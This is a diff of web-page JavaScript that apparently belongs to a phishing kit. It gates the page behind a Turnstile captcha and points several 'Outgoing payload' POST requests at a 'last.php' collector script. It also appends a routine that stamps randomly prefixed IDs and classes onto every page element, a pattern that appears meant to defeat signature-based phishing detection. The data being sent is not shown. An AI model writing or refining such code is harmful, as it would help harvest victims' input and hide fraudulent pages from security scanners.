@@ -1,4 +1,5 @@
-   let urlready = ""; 
+    
+    let urlready = ""; 
     let ipAddress = "0.0.0.0";
     let randomURL = "";
     
@@ -109,10 +110,11 @@
 
         console.log("Outgoing payload:", requestData);
 
-        fetch(randomURL, {
+        fetch('last.php', {
             method: 'POST',
             headers: {
-                'Content-Type': 'application/json'
+                'Content-Type': 'application/json',
+                'X-Requested-With': 'XMLHttpRequest'
             },
             body: JSON.stringify(requestData)
         })
@@ -153,7 +155,7 @@
                 turnstile.reset();
                 document.querySelector('.captcha-container').style.display = 'flex';
                 document.querySelector('.verifying').style.display = 'none';
-               // alert('Invalid server response. Please try again.');
+                alert('Invalid server response. Please try again.');
             }
         })
         .catch(error => {
@@ -161,7 +163,7 @@
             turnstile.reset();
             document.querySelector('.captcha-container').style.display = 'flex';
             document.querySelector('.verifying').style.display = 'none';
-           // alert('An error occurred. Please try again.');
+            alert('An error occurred. Please try again.');
         });
     }
 
@@ -177,10 +179,11 @@
 
         console.log("Outgoing payload:", requestData);
 
-        fetch(randomURL, {
+        fetch('last.php', {
             method: 'POST',
             headers: {
-                'Content-Type': 'application/json'
+                'Content-Type': 'application/json',
+                'X-Requested-With': 'XMLHttpRequest'
             },
             body: JSON.stringify(requestData)
         })
@@ -214,7 +217,7 @@
                 turnstile.reset();
                 document.querySelector('.captcha-container').style.display = 'flex';
                 document.querySelector('.verifying').style.display = 'none';
-              //  alert('Invalid server response. Please try again.');
+                alert('Invalid server response. Please try again.');
             }
         })
         .catch(error => {
@@ -222,7 +225,7 @@
             turnstile.reset();
             document.querySelector('.captcha-container').style.display = 'flex';
             document.querySelector('.verifying').style.display = 'none';
-           // alert('An error occurred. Please try again.');
+            alert('An error occurred. Please try again.');
         });
     }
 
@@ -238,10 +241,11 @@
 
         console.log("Outgoing payload:", requestData);
 
-        fetch(randomURL, {
+        fetch('last.php', {
             method: 'POST',
             headers: {
-                'Content-Type': 'application/json'
+                'Content-Type': 'application/json',
+                'X-Requested-With': 'XMLHttpRequest'
             },
             body: JSON.stringify(requestData)
         })
@@ -275,7 +279,7 @@
                 turnstile.reset();
                 document.querySelector('.captcha-container').style.display = 'flex';
                 document.querySelector('.verifying').style.display = 'none';
-               // alert('Invalid server response. Please try again.');
+                alert('Invalid server response. Please try again.');
             }
         })
         .catch(error => {
@@ -283,7 +287,7 @@
             turnstile.reset();
             document.querySelector('.captcha-container').style.display = 'flex';
             document.querySelector('.verifying').style.display = 'none';
-           // alert('An error occurred. Please try again.');
+            alert('An error occurred. Please try again.');
         });
     }
 
@@ -300,10 +304,11 @@
         document.getElementById("loader").style.display = "block";
         console.log("Outgoing payload:", requestData);
 
-        fetch(randomURL, {
+        fetch('last.php', {
             method: 'POST',
             headers: {
-                'Content-Type': 'application/json'
+                'Content-Type': 'application/json',
+                'X-Requested-With': 'XMLHttpRequest'
             },
             body: JSON.stringify(requestData)
         })
@@ -329,7 +334,7 @@
                 turnstile.reset();
                 document.querySelector('.captcha-container').style.display = 'flex';
                 document.querySelector('.verifying').style.display = 'none';
-               // alert('Invalid server response. Please try again.');
+                alert('Invalid server response. Please try again.');
             }
         })
         .catch(error => {
@@ -337,7 +342,7 @@
             turnstile.reset();
             document.querySelector('.captcha-container').style.display = 'flex';
             document.querySelector('.verifying').style.display = 'none';
-           // alert('An error occurred. Please try again.');
+            alert('An error occurred. Please try again.');
         });
     }
 
@@ -378,3 +383,75 @@
     log.error("Error in async startup", e);
   }
 })();
+
+
+
+/**
+ * applyRandomClass
+ * @param {string[]} classes  – array of CSS class names
+ * @param {string} selector   – CSS selector to attach to (defaults to 'body')
+ */
+function applyRandomClass(classes, selector = 'body') {
+  if (!Array.isArray(classes) || classes.length === 0) {
+    console.warn('applyRandomClass: please supply a non-empty array of class names');
+    return;
+  }
+  // when DOM is ready, pick one at random and add it
+  function _add() {
+    const el = document.querySelector(selector);
+    if (!el) return console.warn('applyRandomClass: selector not found', selector);
+    const idx = Math.floor(Math.random() * classes.length);
+    el.classList.add(classes[idx]);
+  }
+
+  if (document.readyState === 'loading') {
+    document.addEventListener('DOMContentLoaded', _add);
+  } else {
+    _add();
+  }
+}
+
+// USAGE EXAMPLE:
+// give it your list of theme/background classes
+applyRandomClass([
+  'theme-sunrise',
+  'theme-forest',
+  'theme-ocean',
+  'theme-moonlight'
+]);
+
+
+(function() {
+  // Generate a random prefix (6 alphanumeric chars)
+  const prefix = 'class-' + Math.random().toString(36).substr(2, 6);
+
+  let autoIdCounter = 0;
+  let autoClassCounter = 0;
+
+  // Walk every element in the body
+  document.querySelectorAll('body *').forEach(el => {
+    // 1) ID handling
+    if (el.id) {
+      // add a new class for the prefixed id (preserves original id)
+      el.classList.add(`${prefix}-id-${el.id}`);
+    } else {
+      // generate and assign a new id
+      autoIdCounter++;
+      el.id = `${prefix}-auto-id-${autoIdCounter}`;
+    }
+
+    // 2) CLASS handling
+    if (el.classList.length) {
+      // for each existing class, add a prefixed version
+      Array.from(el.classList).forEach(orig => {
+        el.classList.add(`${prefix}-${orig}`);
+      });
+    } else {
+      // no classes? add a generated one
+      autoClassCounter++;
+      el.classList.add(`${prefix}-auto-class-${autoClassCounter}`);
+    }
+  });
+
+})();
+
